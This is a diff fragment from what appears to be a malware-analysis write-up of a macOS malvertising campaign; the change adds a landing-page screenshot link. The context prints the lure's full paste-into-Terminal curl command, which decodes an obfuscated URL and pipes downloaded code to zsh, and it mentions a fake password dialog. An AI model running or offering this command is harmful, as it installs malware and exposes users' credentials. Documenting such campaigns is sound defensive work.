@@ -26,6 +26,8 @@ The AppleScript pops a fake auth dialog that loops until the user enters a valid
 
 Sponsored Google result for "macos system data" points to `macclean[.]craft[.]me`, a Craft[.]me page posing as a macOS storage cleanup guide. The page instructs the user to paste a curl command into Terminal.
 
+![Landing page](img/landing_page.png)
+
 ```bash
 curl -SLskf $(echo 'aHR0cHM6Ly9wdHJlaS5jb20vY3VybC82NzExMjg2Y2I5YjBlMDE1ZjRlMTc3OTk2Zjg5NDM4ODcxYmIzY2FmMjZiOGYyNThjZDQ0N2U3ZGVjNzY4ZGU0'|base64 -D)|zsh
 ```
